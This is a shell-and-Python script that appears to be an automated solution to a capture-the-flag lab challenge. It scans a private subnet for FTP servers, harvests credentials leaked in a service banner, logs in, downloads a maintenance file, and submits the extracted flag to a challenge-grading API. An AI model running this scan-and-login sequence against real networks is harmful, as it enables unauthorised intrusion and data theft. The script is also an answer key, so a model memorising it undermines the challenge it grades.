#!/bin/sh
set -eu

flag="$(python3 - <<'PY'
import ftplib
import io
import re
import subprocess

scan = subprocess.run(
    ["nmap", "-n", "-Pn", "-p", "21", "--open", "-oG", "-", "172.20.0.141-199"],
    check=True, capture_output=True, text=True, timeout=45
)
hosts = []
for line in scan.stdout.splitlines():
    if "21/open/tcp" in line:
        match = re.match(r"Host: (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            hosts.append(match.group(1))

for host in hosts:
    greeting = subprocess.run(
        ["ncat", "-w", "2", host, "21"], capture_output=True, text=True, timeout=5
    ).stdout
    if "actuator console" not in greeting.lower():
        continue
    credentials = re.search(r"user=([A-Za-z0-9_-]+)\s+password=([A-Za-z0-9_-]+)", greeting)
    if not credentials:
        continue
    ftp = ftplib.FTP(host, timeout=5)
    try:
        ftp.login(credentials.group(1), credentials.group(2))
        contents = io.BytesIO()
        ftp.retrbinary("RETR /maintenance/actuator-status.txt", contents.write)
        flag = re.search(rb"BSY\{[^}\r\n]+\}", contents.getvalue())
        if flag:
            print(flag.group(0).decode())
            break
    finally:
        ftp.quit()
else:
    raise SystemExit("Actuator console or protected record not found")
PY
)"

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-500f63\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
